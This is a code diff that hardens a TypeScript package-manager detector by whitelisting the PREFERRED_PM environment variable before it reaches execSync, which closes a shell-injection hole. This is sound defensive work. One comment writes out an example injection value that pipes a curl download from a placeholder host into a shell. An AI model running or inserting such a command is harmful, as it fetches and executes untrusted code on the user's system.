@@ -1,6 +1,21 @@
 import { execSync } from "node:child_process";
+import { logger } from "./logger";
 
 export type PmName = "pnpm" | "bun" | "yarn" | "npm";
+
+const SUPPORTED_PMS: readonly PmName[] = ["pnpm", "bun", "yarn", "npm"];
+
+/**
+ * Accept only a supported package manager name.
+ *
+ * `PREFERRED_PM` is handed straight to the availability probe below, which
+ * interpolates it into `execSync`, so an unchecked value such as
+ * `PREFERRED_PM=npm && curl -s https://example.invalid/sh | sh` is a shell
+ * injection vector. Anything outside the whitelist is reported and ignored.
+ */
+function toPmName(value: string | undefined): PmName | null {
+  return SUPPORTED_PMS.find((pm) => pm === value) ?? null;
+}
 
 /**
  * Try to run `--version` for a command to see if it's available.
@@ -48,12 +63,18 @@ export interface PackageManager {
  * Main detector.
  * Order of precedence:
  * 1. npm_config_user_agent (when present)
- * 2. explicit env PREFERRED_PM (if set and available)
+ * 2. explicit env PREFERRED_PM (when it names a supported manager and is available)
  * 3. check common CLIs in a preferred order: pnpm -> bun -> yarn -> npm
  */
 export function detectPackageManager(): PackageManager {
-  const preferred =
-    (process.env.PREFERRED_PM as PmName | undefined) ?? undefined;
+  const requested = process.env.PREFERRED_PM;
+  const preferred = toPmName(requested);
+
+  if (requested && !preferred) {
+    logger.warn(
+      `Ignoring PREFERRED_PM "${requested}"; use one of ${SUPPORTED_PMS.join(", ")}.`,
+    );
+  }
 
   const fromUA = detectFromUserAgent();
   const candidates: PmName[] = [];
@@ -61,8 +82,7 @@ export function detectPackageManager(): PackageManager {
   if (fromUA) candidates.push(fromUA);
   if (preferred && !candidates.includes(preferred)) candidates.push(preferred);
 
-  ["pnpm", "bun", "yarn", "npm"].forEach((p) => {
-    const pm = p as PmName;
+  SUPPORTED_PMS.forEach((pm) => {
     if (!candidates.includes(pm)) candidates.push(pm);
   });
 
